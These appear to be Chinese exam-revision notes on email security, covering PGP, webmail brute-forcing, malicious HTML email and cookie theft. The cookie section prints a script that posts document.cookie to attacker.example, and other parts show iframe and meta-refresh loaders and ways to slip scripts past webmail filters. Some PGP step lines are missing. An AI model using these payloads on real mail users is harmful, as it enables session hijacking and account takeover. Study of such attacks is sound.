1.1 邮件系统的三大组成部件 课本 p.306

课本第一句话就是考点：一个典型的电子邮件系统有三个主要组成部件 ——

① 用户代理 UA
User Agent，用户与邮件系统的接口。Outlook Express、Foxmail、手机邮件 App 都是。至少要能做三件事：显示、撰写、处理（发送/接收/阅后删除/存盘/打印/转发/分类保存）。
② 邮件服务器
邮件系统的核心构件。按客户/服务器方式工作，负责收发邮件并向发信人报告传送情况（已交付／被拒绝／丢失）。其中负责发送的部件叫邮件传输代理 MTA（Mail Transfer Agent）。
③ 邮件使用的协议
发送用 SMTP，接收用 POP3 或 IMAP。发和收是两个不同的协议 —— 这一点必须记牢。
为什么"发"和"收"要用两个协议？

因为它们干的是两件不同的事。SMTP 是"推"：把邮件从你这里推到对方服务器，是服务器之间的接力，推完就结束。 POP3/IMAP 是"拉"：你的邮件早就躺在自己服务器的邮箱里了，你要做的是去把它取回来。 推和拉的方向相反、时机不同（收信人可能一个月后才上线），所以不可能用同一个协议。

信封 envelope
邮件传输程序根据信封上的信息来传送邮件。信封上最重要的就是收信人地址。
内容 content
用户从自己邮箱里读取邮件时才能见到的部分。
地址格式
收信人邮箱名@邮箱所在主机的域名。@ 读作 at，表示"在"。

先想清楚这个顺序问题

签名、压缩、加密，三件事到底谁先谁后？

接收方就是把这条线倒着走一遍

重组 → Base64 解码 → 分解 → 用 B 的私钥 PR_B 解出 Ks → 用 Ks 对称解密 → 解压缩 → 分解出签名和正文 → 用 A 的公钥 PU_A 验签 → 对比散列值。

2.4 逐步拆解：PPT 那 9 页流程图讲了什么 PPT p.15–23

PPT 把 PGP 拆成了四条独立的流程（只加密／只解密／只签名／只验签），最后再合成完整流程。 下面按 PPT 的原始步骤号逐条列出，每一步后面补一句"为什么要有这一步"。

(A) 只加密：PGP 加密过程 PPT p.15，共 6 步

用伪随机数生成器生成会话密钥。
为什么：每封邮件一把新钥匙，用完即弃。即使某一次被泄露，也不影响下次。
用公钥密码加密会话密钥（用接收者的公钥）。
为什么：对称密钥怎么安全送到对方手上？——套进只有对方私钥能打开的信封里。这一步就是"数字信封"。

为什么：省流量省空间，并且减少明文冗余、让后一步的加密更难被分析。注意压缩排在加密之前。

为什么：邮件正文可能很长，公钥算法慢得没法用，只能上对称算法。
将加密的会话密钥（步骤 2）与加密的消息（步骤 4）拼合起来。
为什么：钥匙必须跟着锁一起寄，否则对方拿到密文也打不开。
将步骤 5 的结果转换为文本数据，转换后的结果就是报文数据。
为什么：前面出来的是二进制，很多邮件系统只收 ASCII。这就是 Base64（Radix 64）。

(B) 只解密：PGP 解密过程 PPT p.16，共 9 步

接收者输入解密的口令。
为什么：私钥自己也是加密存放在私钥环里的 —— 前 3 步都在"先把自己的私钥解出来"。
求口令的散列值，生成用于解密私钥的密钥。
为什么：口令长度不定，散列一下正好得到定长的对称密钥。课本 p.315：SHA-1 → 160 比特
将钥匙串（私钥环）中经过加密的私钥进行解密，得到接收者的私钥。
为什么：就算电脑被偷，没有口令也拿不到私钥。
将报文数据（文本数据）转换成二进制数据。
为什么：撤销发送方的 Base64 编码。
将二进制数据分解成两部分：加密的会话密钥、经过压缩和加密的消息。
为什么：把"钥匙"和"锁着的箱子"分开。
用公钥密码算法解密会话密钥，使用步骤 3 中得到的接收者的私钥。
为什么：拆信封，取出对称钥匙。
用对称密码解密"经过压缩和加密的消息"，使用步骤 6 得到的会话密钥。
为什么：开箱。此时拿到的还是压缩包。

为什么：撤销发送方的压缩。顺序必须是"先解密再解压"，与发送方"先压缩再加密"严格对称。
得到原始消息。

为什么：只有持私钥的人能生成，人人可用其公钥验证 → 真实性 + 不可否认性。关于"签名"和"加密"这两个说法，见下面的术语对照。

将报文数据（文本数据）转换为二进制数据。
将经过压缩的数据进行解压缩。
分解成"经过签名的散列值"和"消息"两部分。
将经过签名的散列值（经过加密的散列值）用发送者的公钥进行解密，恢复出发送者发送的散列值。
为什么用发送者的公钥：因为签名是用发送者的私钥做的。公私钥必须配对使用。
将步骤 3 分解出的消息输入单向散列函数计算散列值。
为什么：这是"我自己算的指纹"，用来跟"他寄来的指纹"比对。
将步骤 4 得到的散列值与步骤 5 得到的散列值进行对比。
相等则数字签名验证成功，不相等则验证失败。
不等意味着什么：要么邮件被改过（完整性破坏），要么不是这个人发的（真实性破坏）——但分不清是哪一种。

正文原话：这一步相当于使用私钥进行加密		同一件事：用发送者的私钥，对消息的散列值做的那一次公钥运算。
反向那一次（用发送者公钥）同理。

最准确的说法是「签名 / 验签」，不是「加密 / 解密」。之所以能混着说，只是因为在 RSA 里这两种运算的数学形式恰好长得一样。

而且这个说法有个硬伤：表 10-2 明写签名算法可以是 DSS 或 RSA，而 DSS 只能签名、根本不能用来加密。 所以读图时的正确做法是 —— 只看"用了谁的哪把钥匙、作用在什么数据上"，不要纠结那个动词叫什么。

2.5 数字信封：为什么要"两把锁套着用" 课本 p.312–313

先想一分钟

既然 RSA 能加密，为什么不直接用 RSA 把整封邮件加密了事？

因为公钥算法慢——基于大数模幂运算，比对称算法慢好几个数量级，长邮件根本扛不住。 可要是只用对称算法，又回到了老问题：那把对称密钥怎么送给对方？（这正是 简答 11 考的。）

课本原文（可直接抄进卷子）课本 p.312

「在加密方法上，PGP 用公开密码算法对会话密钥 Ks 进行加密（使用接收方的公钥 PUB）， 然后用对称密码算法对压缩后的报文进行加密（使用会话密钥 Ks）。 这种链式加密方法（也称为"数字信封"）既有公开密码体系的保密性，又有对称密码体系的高效性， 从而既保证了邮件正文的机密性，又安全地传递了对称密码算法的密钥。」

「另外，会话密钥是发送方随机产生的，不需要和接收方协商密钥，且只用一次， 即使偶然被泄露，也不会影响到下次邮件的发送过程。」

★ 单选 5「PGP 中，会话密钥的安全交换采用的技术称为」→ A. 数字信封

另外三个选项要能一眼排除：Diffie-Hellman 是双方协商出密钥（PGP 不协商，是单方生成后送过去）； 线下交换 不现实；KDC 需要可信第三方在线（那是 Needham-Schroeder 的路子，PGP 没有 KDC）。

2.6 老师的三道讨论题（PPT 提了问，下一页没答案）PPT p.24–26

★ 为什么单独拎出来讲

这三道题全是"为什么这样设计"，不是"是什么" —— 正好是开卷考试最爱出的那一类：翻书翻不到现成段落，必须理解。 而且课本习题原封不动地又考了一遍（单选 4、简答 2、简答 12）。答案都在课本 p.312–313，下面逐条给全。

讨论一：签名、加密、压缩的顺序问题 PPT p.24 课本 p.312

结论：先签名 → 再压缩 → 最后加密。（这正是单选 4 的答案 A，也是你在课本 p.312 页眉上写的那句「顺序：先签名」。）

① 为什么签名要排在压缩之前？（两点）

第一，便于验证。课本原文「是对没压缩的消息进行签名，可便于对签名的验证； 如果在压缩后再签名，则需要保存压缩后的消息，或在验证时重新压缩消息，增加了处理的工作量。」

第二，也是更硬的理由：ZIP 的结果不唯一。课本原文「由于压缩算法 ZIP 在不同的实现中会在运算速度和压缩率之间寻求平衡， 因而可能会产生不同的压缩结果（当然，直接解压结果是相同的），因此压缩后再签名就可能导致无法实现鉴别 （接收方在验证签名时可能会因压缩的原因而出现验证失败）。」

说人话：签名是对"某一串确定的字节"按指纹算的。原文是唯一的，压缩包却不是——你我用不同版本的 ZIP 压同一份文件，得到的字节可能不一样，指纹自然对不上。所以只能对原文签名。

② 为什么压缩要排在加密之前？（两点）

课本原文「PGP 对加密前的明文（含签名）进行压缩，而不是在加密后再压缩，主要原因也有两点：」

第一，省资源。「先压缩再加密方案缩短了报文大小，从而减少了网络传输时间和存储空间。」

第二，更安全。「经过压缩实际上是经过了一次变换，变换后减少了明文中上下文的关系，比原始消息的冗余信息更少， 再加密的安全性更高；而如果先加密，再压缩，效果会差一些。」

说人话：密码分析靠的就是明文里的规律（重复的词、固定的格式）。压缩正好是"专门消灭重复"的工具，压完再加密，攻击者能抓的把柄就少了。
反过来还有个工程理由：密文是接近随机的字节流，根本压不动——先加密再压缩等于白压。

讨论二：为什么要进行 Base64 编码？对性能的影响如何？ PPT p.25 课本 p.313

为什么要编码：课本原文「在兼容性方面，加密后的报文使用 Base64 编码将报文转换成 ASCII 字符串， 主要考虑到很多文件系统只允许使用 ASCII 字符组成的报文。」

→ 根因：加密和压缩的输出都是任意二进制字节，其中很多值在老式邮件系统里是非法的甚至有特殊含义（会被截断、被改写）。Base64 把它们映射进一个"绝对安全"的 64 个可打印字符的小圈子里。表 10-2 里这一行叫 Radix 64，它就是 MIME 的 Base64。

对性能的影响：课本原文「在实际应用中，使用 Base64 编码转换后将导致消息大小增加 33% （每 3 字节的二进制数据映射成 4 个 ASCII 字符）。由于加密前对消息进行了压缩，因此实际的性能下降幅度要小很多。」

→ 33% 这个数字要记住，算法是 4÷3 − 1。答题时最好把三句话都写上：膨胀 33% → 但前面压缩过 → 所以净影响小得多。这是简答 12 的完整答案。

讨论三：为什么要分段？会话密钥部分和签名部分在第几个报文段？ PPT p.26 课本 p.313

为什么要分段：课本原文「PGP 还需考虑电子邮件系统文件设施对最大报文长度的限制 （一般为 50 000 字节），因此，PGP 还需提供报文的分段和重组功能。」

在第几段：课本原文「分段是在所有其他的处理（包括 Base64 编码转换）完成后才进行的，因此， 会话密钥部分和签名部分只在第一个报文段的开始位置出现一次。」

接收端：「PGP 必须剥掉所有的电子邮件首部，才能重新装配成原来的完整分组。」

→ 为什么"分段放在最后"这一句是关键：如果先分段再各自加密签名，那每一段都得自带一份会话密钥和签名，浪费不说，还得管 N 套密钥。 放在最后分，整封信只是被机械地切成几截字符串，所以那两样东西天然只在第 1 段的开头。答这道题只要抓住"分段是最后一步"，结论自然就出来了。

2.8 PGP 密钥管理 课本 10.3.2（p.314–316） · PPT 未讲，但习题考了 6 道

(1) 会话密钥的生成与管理 课本 p.314 —— 简答 4 直接考

会话密钥 Ks 由伪随机数生成器 PRG 产生，该 PRG 基于美国国家标准「金融机构密钥管理（大规模）」ANSI X 9.17 中定义的随机数生成方法，产生 128 位随机数，只用于一条消息的一次加解密过程。
要记的数字：ANSI X 9.17、128 位、一次性。
随机数产生器的输入包括：1 个 128 位密钥，2 个 64 位待加密的明文块（随机数种子）。
即：一把钥匙 + 两块种子。
随机数种子由键盘输入产生（用户应尽量随机无规律地击键）：用户随机键入 12 个字符，每个字符表示成 8 比特的数值，12 × 8 = 96 比特，再加上表示键入日期/时间的 32 比特，形成一个 128 比特的随机数据流。
96 + 32 = 128 —— 这个算式是简答 4 的得分点，务必写出来。为什么要人手敲？因为计算机自己产生不了真随机，得从人的击键节奏里"取熵"。
然后将此数据流分成两个 64 比特的明文分组，输入随机数产生器中。128 位密钥为上一次算法输出的会话密钥。
这就是"上一次的输出当这一次的钥匙"，链条式往下滚。
随机数产生器根据输入的种子和密钥产生 2 个 64 位密文块，串联起来形成 128 位的会话密钥。
ANSI X 9.17 最开始规定的加密算法是 DES，后来在标准修订版或基于该标准的其他标准中增加了 3DES、IDEA、CAST-128、AES 等对称加密算法。
如何安全交换：会话密钥使用接收方的公开密钥加密后发送给接收方，接收方收到后用自己的私钥解密得到本次会话的会话密钥。
PGP 通过这种方法实现了会话密钥的安全交换（＝数字信封）。这一句是简答 4 的收尾。

(2) 公开密码算法的密钥管理 课本 p.314–315

课本原文「PGP 采用公开密码机制来实现会话密钥的交换以及数字签名功能，因此必须提供公钥和私钥的发布和管理机制。」

私钥是怎么被保护起来的 课本 p.315
用户首先选择一个加密私钥的口令短语（passphrase）p。
为什么：私钥是一长串随机字节，人记不住；口令是人能记住的。要把两者挂上钩。
系统利用 RSA 或 Diffie-Hellman 生成一对新的公钥/私钥对时，要求用户输入口令短语作为 SHA-1 的输入，产生一个 160 比特的消息摘要 h(p)，然后销毁口令短语。
为什么要销毁：内存里留着口令＝留着后门。
系统用上一步产生的 160 比特消息摘要值作为密钥，利用对称加密算法 CAST-128（或 IDEA、3DES、AES）对密钥对中私钥部分加密，并把加密结果存储在私钥环中，然后销毁用作密钥的消息摘要值。
结果：私钥环里躺着的是私钥的密文。硬盘被拷走也没用。
用的时候：用户需要使用私钥来加密或签名时，查询私钥环，输入口令短语，计算口令短语的消息摘要值，并以此 160 比特的消息摘要作为密钥解密私钥密文，从而获得私钥。
这正好解释了 §2.4 里"解密/签名流程的头 3 步为什么都在折腾口令"。

X.509 的答案是"往上问权威"；PGP 的答案是"问你信得过的熟人"。

课本原文（可直接抄）课本 p.315：「在信任关系的建立上，PGP 主要采用以用户为中心的信任模型（参见 4.3.1 节）， 也就是信任网模型（Web of Trust）。该模型中，没有一个统一的认证中心来管理用户公钥，每个人都可以作为一个 CA 对某个用户的公钥签名， 以此来说明这个公钥是否有效（可信）。」

PGP 中对公钥的信任基于两点：「一是直接来自你所信任的人的公钥；二是由你所信任的人为某个你并不熟悉的人所签署的公钥。 也就是说，PGP 的用户在得到一个公钥后，首先检验其数字签名，如果该公钥的数字签名是由你信任的人签署的，就认为此公钥是合法可信的。 这样，由你认识且信任的人，就可以和众多不认识的人建立一个网状的信任模型（称为"信任网"）。」

签名可信性字段的赋值方法课本 p.316：「一个公钥可以有一个或多个签名证书，当为该公钥插入一个签名到公钥环中时， PGP 首先搜索公钥环，查找签名者是否是已知公钥的拥有者。如果是，则将拥有者可信性字段中的标志赋给签名可信性字段；否则，将签名可信性字段赋值为不信任。」

密钥合法性字段的取值计算 课本 p.316 —— 简答 5

课本原文：「密钥合法性字段的取值由此公钥的所有签名的签名可信性字段的取值计算得到。具体计算方法如下：

① 如果该公钥的签名可信性字段中至少有一个标志为「绝对信任」，则将此公钥的密钥合法性字段标志为「合法」；

② 否则，PGP 计算所有签名信任值的加权和，即：签名可信性字段标志为「一直信任」的权重为 1/X，标志为「部分信任」的权重为 1/Y。其中，X 和 Y 是用户设置的参数。 当该公钥的签名可信性字段的加权和等于或大于 1 时，则将密钥合法性字段标志为「合法」，即公钥是有效的。」

③ 「因此，在没有绝对信任的情况下，需要至少 X 个签名是可信的，或者至少 Y 个签名是可信的，或者上述两种情况的某种组合。」

课本给的例子：「如果设置 X = 1，Y = 2，则表示一个「一直信任」的密钥拥有者签名的公钥即为合法密钥，而两个「部分信任」的密钥拥有者签名的公钥也为合法密钥。」

自己再验算两个组合（答简答 5 时"举例说明"这四个字就靠它）

设 X = 2，Y = 4 ⇒ 一直信任每个记 1/2，部分信任每个记 1/4，加起来 ≥ 1 才算合法。

  • 2 个"一直信任" ⇒ 1/2 + 1/2 = 1 ✔ 合法
  • 4 个"部分信任" ⇒ 4 × 1/4 = 1 ✔ 合法
  • 1 个"一直信任" + 2 个"部分信任" ⇒ 1/2 + 1/4 + 1/4 = 1 ✔ 合法（这就是课本说的"某种组合"）
  • 1 个"一直信任" + 1 个"部分信任" ⇒ 1/2 + 1/4 = 3/4 < 1 ✘ 不合法
  • 只要有 1 个"绝对信任" ⇒ 不用算，直接合法

孤立用户的情形课本 p.316：「如果一个用户是拥有一个或多个未知用户签名的孤立用户，则他的公钥可能是你从公钥服务器中得到的。 由于没有信任者的签名，因此 PGP 认为该用户的公钥是不合法的。」——加权和为 0，自然不合法。

公钥的撤销，与 PGP 的薄弱环节 课本 p.316

「当用户怀疑自己的私钥泄露或想终止其使用，可以撤销自己当前正在使用的公钥。通常情况下，撤销一个公钥需要公钥所有者 发布一个由他签名的公钥撤销证书，该证书格式和一般签名证书一样，但有一个标志指示此证书的目的是撤销该公钥的使用。 需要注意的是该证书所用的签名私钥应与所撤销的公钥相对应。」

⚠ PGP 的两处已知弱点（简答 8「比较 PEM/S-MIME/PGP 优缺点」的扣分点）

① 撤销机制弱。课本原文「PGP 缺少 PKI 体系那样严格的证书撤销机制，很难确保没有人使用一个已不安全的密钥， 是 PGP 安全体系中比较薄弱的环节。」→ 根因：没有权威中心，撤销证书只能靠"自己喊、别人听见"，喊了没人收到也没办法。

② SHA-1 已被攻破，牵连身份签名。课本 p.316「2019 年 10 月，密码学家盖坦·勒伦和托马·佩林宣布已经对 SHA-1 成功计算出第一个选择前缀冲突，并选择 PGP/GnuPG 信任网络来演示 SHA-1 的前缀冲突攻击。 出于兼容性原因，默认情况下 GnuPG（1.4 版）的旧分支仍默认使用 SHA-1 进行身份认证。 使用 SHA-1 选择前缀冲突，创建了两个具有不同 UserID 的 PGP 密钥：密钥 B 是 Bob 的合法密钥（由信任网签名），密钥 A 是用 Alice ID 伪造的密钥， 并将密钥 B 中的签名转移到密钥 A 中。由于哈希冲突，该签名在密钥 A 中仍然有效，这样 Bob 可以用 Alice 的名字控制密钥 A，因此 Bob 可冒充 Alice，并以她的名字签署任何文件。 GnuPG 2.2.18 版（2019 年 11 月 25 日发布）已采取措施：对 2019-01-19 之后基于 SHA-1 创建的身份签名视为无效。」

3.1 WebMail 暴力破解 PPT p.31 课本 p.317

攻击是怎么成立的

课本原文：「在 WebMail 中，客户端（浏览器）与服务端的交互，基本上都是通过客户端以提交表单的形式交由服务端程序（如 CGI、ASP 等）处理来实现的，WebMail 的密码验证即是如此。 用户在浏览器的表单元素里输入账户名、密码等信息并提交以后，服务端对其进行验证，如果正确的话，则欢迎用户进入自己的 WebMail 页面；否则，返回一个出错页面给客户端。」

⚠ 漏洞的根子：服务器"对/错"回答得太诚实

攻击者「不断地用不同的密码尝试登录，通过比较返回页面的异同，从而判断出邮箱密码是否破解成功」。 破解工具（如 wwwhack、小榕的溯雪）「本身就是一个功能完善的浏览器，通过分析和提取页面中的表单，给相应的表单元素挂上字典文件，再根据表单提交后返回的错误标志判断破解是否成功」。

所以这类攻击成立需要两个条件：① 能无限次试；② 每次都能清楚地分辨对与错。下面三种防范，就是分别掐这两条。

1禁用账户把受到暴力破解的账户禁止一段时间登录，一般是 5～10 分钟。「如果攻击者总是尝试暴力破解，则该账户就一直处于禁用状态不能登录，导致真正的用户不能访问自己的邮箱，从而形成 DoS 攻击。」
→ 防守动作本身变成了攻击手段，这是本章最漂亮的一个例子。
2禁止 IP 地址把进行暴力破解的 IP 地址禁止一段时间不能使用 WebMail。「虽然在一定程度上解决了"禁用账户"带来的问题，但更大的问题是，这势必导致在网吧、公司、学校甚至一些城域网内共用同一 IP 地址访问 Internet 的用户不能使用该 WebMail。
如果攻击者采用多个代理地址轮换攻击，甚至采用分布式的破解攻击，那么"禁止 IP 地址"就难以防范了。」
→ 一边误伤好人（一个 IP 后面是一整栋楼），一边挡不住坏人（换代理即可）。
3登录检验
（即验证码）		「这种防范措施一般与上面两种防范措施结合起来使用，在禁止不能登录的同时，返回给客户端的页面中包含一个随机产生的检验字符串，只有用户在相应的输入框里正确输入了该字符串才能进行登录，这样就能有效避免上面两种防范措施带来的负面影响。」「不过，攻击者依然有机可乘：通过开发出相应的工具提取返回页面中的检验字符串，再将此检验字符串作为表单元素值提交，那么又可以形成有效的 WebMail 暴力破解了。
如果检验字符串是包含在图片中，而图片的文件名又是随机产生的，那么攻击者就很难开发出相应的工具进行暴力破解了。」
→ 这一句解释了验证码为什么必须是图片：只要它在 HTML 文本里，脚本就能读走。
课本的结论：技术手段都靠不住，最后还得靠密码本身

「虽然 WebMail 的暴力破解有诸多的防范措施，但它还是很难被完全避免的。如果 WebMail 系统把一分钟内 5 次错误的登录当成是暴力破解，那么攻击者就会在一分钟内只进行 4 次登录尝试。 所以，防范 WebMail 暴力破解还主要靠用户自己采取良好的密码策略，如密码足够复杂、密码差异化、密码定期更改等。这样，攻击者就很难暴力破解成功。」

「一分钟只试 4 次」这个细节值得记 —— 它说明基于阈值的防御一定可以被"降速绕过"。

3.2 恶意 HTML 邮件 PPT p.31–35 课本 p.318–320

起点是一个格式问题课本 p.318：「电子邮件有两种格式：纯文本（txt）和超文本（HTML）。 HTML 邮件由 HTML 语言写成，当通过支持 HTML 的邮件客户端或以浏览器登录进入 WebMail 查看时，有字体、颜色、链接、图像和声音等。许多垃圾广告就是以 HTML 邮件格式发送的。」

⚠ 病根一句话：邮件正文变成了一个"会执行的网页"

纯文本邮件顶多骗你的眼睛；HTML 邮件里可以有表单、脚本、外链、iframe——它是在你的邮箱页面里跑起来的。 攻击者要的不是让你看到什么，而是让你的浏览器替他做什么。

(A) 用 HTML 表单偷偷改掉你的邮箱密码 课本 p.318

攻击者分析 WebMail 密码修改页面的各表单元素，设计一个隐含有同样表单的 HTML 页面。
他要伪造的不是页面外观，而是那个表单的提交结构。
预先给"新密码"表单元素赋值（填成他自己知道的密码）。
这一步是关键：受害者从头到尾没输入过任何东西。
以 HTML 邮件发送给用户，欺骗用户说在页面中提交某个表单或点击某个链接就能打开一个精彩网页。
诱饵。用户以为自己在点"看图"。
用户照做后，在打开"精彩网页"的同时，一个修改邮箱密码的表单请求已经发向 WebMail 系统。
为什么会成功：用户此刻是登录状态，浏览器会自动带上他的会话凭证。这就是第 9 章的 CSRF。
「而这一切用户完全不知情，直到下次不能登录进自己邮箱的时候才会知道。」
攻击是静默的，发现时已经晚了。
防范（课本给的原话，简答里要写）

「为了防止此类的 HTML 邮件欺骗，在修改邮箱配置时，特别是修改邮箱密码和提示问题时，WebMail 系统有必要让用户输入旧密码加以确认， 这样也能有效防止截取到当前 WebMail 会话的攻击者更改邮箱密码。」

→ 为什么"输入旧密码"就能挡住：因为旧密码是攻击者唯一伪造不了的东西——他能借用你的会话，但不知道你的密码。

(B) 在 HTML 邮件里嵌恶性脚本 PPT p.31 课本 p.318

PPT 原文：「在 HTML 邮件中嵌入恶性脚本程序，攻击者还能进行很多破坏攻击，如 修改注册表、非法操作文件、格式化硬盘、耗尽系统资源、修改"开始"菜单等，甚至能 删除和发送用户的邮件、访问用户的地址簿、修改邮箱账户密码等。」
课本补充：「恶性脚本程序一般由 JavaScript 或 VBScript 脚本语言写成，内嵌在 HTML 语言中， 通过调用 ActiveX 控件或者结合 WSH 来达到破坏攻击目的。」

(C) 绕过 WebMail 脚本过滤的四种方法 课本 p.319

前提：「鉴于脚本程序可能带来的危险，WebMail 系统应尽量禁止 HTML 邮件中的脚本程序，即过滤掉 HTML 源程序中能够使脚本程序运行的代码，如 script 元素等。」 —— 下面四种就是「我不写 script 标签，照样让你执行」。

#方法原理与写法
1事件属性
（事件句柄）		「除了 script 元素内的或在 script 元素内引入的脚本程序能在 HTML 页面装载时被运行，使用事件属性也能调用脚本程序运行，事件属性在 JavaScript 语言里被称为事件句柄，用于对页面上的某个特定事件（如鼠标点击、表单提交）做出响应，驱动 JavaScript 程序运行。」
<tag attribute1 attribute2 onEventName ="javascript code;">
2URI 的 scheme
设成 javascript		「URI 用于定位 Internet 上每种可用的资源。浏览器根据 URI 的资源类型（URI scheme）调用相应的程序操作该资源。如果把一些元素的 URI 属性值的资源类型设为 javascript，则能够调用 JavaScript 程序运行」（注意要用 ; 分隔不同的 JavaScript 语句）。
<tag attribute="javascript:javascript-code;">
3SGML 字符引用
（转十六进制）		「字符引用（character reference）是一种用来指定文档字符集中任何字符的独立编码机制，以 & 开始，以 ; 结束。有两种表达方式：数字字符引用和实体字符引用。数字字符引用的语法为 &#D;（D 代表一个十进制数），或 &#xH;、&#XH;（H 代表一个十六进制数）。」
例：&#65;、&#x41; 表示字母 A；&#27700;、&#x6C34; 表示汉字 水。
「攻击者常将 HTML 语句里的一些字符转为十六进制数，这样能避开 WebMail 系统对脚本程序的过滤。」
重要限制：「元素和属性不可以用字符引用表示。」（所以不能把 script 这个标签名本身编码掉。）
4样式表 @import「在 HTML 语言的 style 标签内可以用 @import 声明输入一个样式表。但是，如果输入的资源类型或内容是 javascript，则 Internet Explorer 浏览器仍然会执行。」

(D) 不直接嵌，而是"引进来"——三种引入外部页面的写法 课本 p.319–320

「除了可以在 HTML 邮件中直接嵌入脚本程序，攻击者还可以设计一些 HTML 代码，在用户打开 HTML 邮件时，不知不觉引入另一个 HTML 文件，而此文件中正含有恶性代码。 这样不仅能直接绕过 WebMail 系统对脚本程序的过滤，而且还能有效避开提供了防毒服务的邮件系统对恶意代码的查杀。」

① refresh 到另一个页面

<meta http-equiv="refresh"
content="1; URL=http://www.attacker.example/another.htm">

② iframe 引入另一个页面

<iframe src="http://www.attacker.example/import.htm" frameborder="0"></iframe>

③ scriptlet 引入另一个页面

<object type="text/x-scriptlet" data=http://www.attacker.example/import.htm></object>

→ 为什么"引入"比"嵌入"更难防：邮件本身干干净净，杀毒和过滤扫不出东西；恶意代码在你打开邮件的那一刻才从远端拉过来。
（示例域名一律用虚构的 attacker.example，课本原文用的是 attacker.com。）

(E) 让恶意 HTML 邮件更隐蔽的三招 课本 p.320

  • 配合邮件欺骗技术，使用户不会怀疑收到的邮件，并且攻击者也能隐藏自己的行踪。
  • 把 HTML 邮件设计成看起来像 TXT 邮件。（你以为纯文本没有危险，恰恰中招。）
  • 有时可以把 HTML 邮件中的恶意代码放在一个隐藏的层里面，表面上看不出任何变化。
⚠ 课本对防范的态度很悲观，答题时要照实写

① 「针对恶意脚本程序的影响，对用户常见的建议办法是提高浏览器的安全级别，如禁用 ActiveX、禁用脚本等，但这并不是一个很好的办法，因为这样会影响到用户对其他正常 HTML 页面的浏览。即使浏览器达到了最高级别，依然对某些利用了浏览器的安全漏洞来实现攻击目的的恶意代码无济于事。」

② 「面对恶意 HTML 邮件，WebMail 系统和用户似乎都没有很好的解决办法」，虽然许多 WebMail 系统已经能够过滤掉很多恶意代码，「但要想彻底过滤掉恶性代码并不是一件容易的事情，攻击者总能利用 WebMail 系统过滤机制和浏览器的漏洞找到办法绕过种种过滤」。

③ 「虽然一些电子邮件系统会在 WebMail 系统上对 HTML 邮件中的恶意代码进行过滤，但在 POP3 服务器上并不会进行过滤。所以，如果是通过邮件客户端收取邮件，仍然要谨防恶意 HTML 邮件的危害。」→ 这一条最容易被忽略：换个客户端，过滤就没了。

3.3 Cookie 会话攻击 PPT p.36 课本 p.320–321

先想清楚 Cookie 为什么存在

如果每点一下都要重新输密码，谁受得了？

课本原文「当用户输入邮箱账户和密码登录进入 WebMail 以后，如果再让用户对每一步操作都输入密码加以确认就会让人不悦。 所以 WebMail 系统一般有必要进行用户会话跟踪，用到的会话跟踪技术主要有两种：Cookie 会话跟踪和 URL 会话跟踪。」
→ Cookie 是"免密码通行证"。既然它能代替密码，偷到它就等于偷到密码。

攻击者怎么拿到 Cookie

PPT p.36 原文：「攻击者获取用户 WebMail 的 Cookie 信息的方法主要有内网监听和 XSS 攻击。」
课本补充：「如果 WebMail 系统存在上一章介绍的跨站脚本执行漏洞，那么攻击者就能欺骗用户从而获取 Cookie 信息。」 「含有恶性脚本程序的 HTML 邮件能使攻击者获取 WebMail 的 Cookie 信息。HTML 邮件中的脚本程序先提取当前 WebMail 的 Cookie 信息，然后把它赋值给某个表单元素，再将表单自动提交给攻击者，攻击者从而获得 Cookie 会话信息。」

课本给的代码例（读懂这四行就够了）课本 p.320

<form method="post" action="http://attacker.example/getcookie.cgi" name="myform">
  <input name="session" type="hidden">
</form>
<script>（脚本内）
  var cookie=(document.cookie);　　← ① 读出当前页面的 Cookie
  document.myform.session.value=cookie;　← ② 塞进隐藏表单域
  document.myform.submit();　　　　← ③ 自动提交给攻击者
</script>

课本原代码里还有一句 alert(cookie); 并注释「这一句用于显示当前 cookie 信息。当然，攻击者不会这样做」——真实攻击是无声的。 getcookie.cgi 是存放在攻击者 Web 服务器上的一个 CGI 程序，用于获取表单提交过来的 Cookie 信息，并且记录下来或者通知攻击者。 「当然，攻击者会把 HTML 邮件、getcookie.cgi 程序设计得更隐蔽，更具欺骗性，让用户难以察觉。」

拿到之后还得让浏览器"认"它 —— 临时 Cookie vs 持久 Cookie

「攻击者在获取 Cookie 信息之后，还要让此 Cookie 信息由浏览器来存取从而与 WebMail 系统建立会话，这样才能侵入用户的 WebMail 邮箱。」

类型存在哪攻击者怎么用
持久型 Cookie存在硬盘上的 Cookie 文件里「攻击者所要做的是把这个信息复制到自己的 Cookie 文件中去，由浏览器存取该 Cookie 信息从而与 WebMail 系统建立会话。」
→ 很省事。所以持久型 Cookie 危险得多。
临时 Cookie存储在内存中，「并不容易让浏览器存取」要让浏览器接受它，攻击者可以编辑内存中的 Cookie 信息，或者修改公开源代码的浏览器让它能编辑 Cookie。
「不过这样都不是很简便的方法，简便的方法是使用 Achilles 程序。Achilles 是一个 HTTP 代理服务器，能够截取浏览器和 Web 服务器间的 HTTP 会话信息，并且在代理转发数据之前可以编辑 HTTP 会话以及临时 Cookie 信息。」
防范（两个层面，答题分开写）

系统侧：PPT p.36「WebMail 系统应该避免使用持久型 Cookie 会话跟踪，使攻击者在 Cookie 会话攻击上不能轻易得逞。」 （理由见上表：持久型只要复制文件就能用，临时的还得靠 Achilles 这类工具折腾。）

用户侧（课本列了三条）：
① 设置浏览器的 Cookie 安全级别，阻止所有 Cookie 或者只接受某几个域的 Cookie；
② 使用 Cookie 管理工具，增强系统 Cookie 安全，如 Cookie Pal、Burnt Cookie 等；
③ 及时给浏览器打补丁，防止 Cookie 信息泄漏。

三个威胁串成一条线（这样记不会漏）

暴力破解＝硬闯大门（猜密码）→ 挡住了，就骗你自己开门（恶意 HTML 邮件让你替他提交表单）→ 还嫌麻烦，干脆偷走通行证（Cookie 会话攻击，连密码都不用知道）。
三者层层递进，后一个都比前一个更省事、更隐蔽。而且它们互相配合：恶意 HTML 邮件正是偷 Cookie 的主要手段之一。

§4垃圾邮件防范 PPT p.38–41（4 页） 课本 10.5

承上
§2 保住了内容，§3 保住了账号 —— 可邮箱还是天天被灌。
本节
这是 §1 里「措施三：邮件服务器安全增强」的落地：让服务器自己学会判断"这封信该不该收"。
留下的坑
三类方法各有各的死角，没有一种能单独用，只能叠起来打。
PPT p.38 · 老师的开场（这就是本节全部难点所在）

从用户的角度看，正常邮件与垃圾邮件的主要区别是该邮件是否是用户所希望收到的邮件。

「用户查看邮件内容后，很容易判断出一封邮件是不是自己想要的邮件。但是，邮件服务器要判断一封邮件是不是垃圾邮件则要困难得多。」

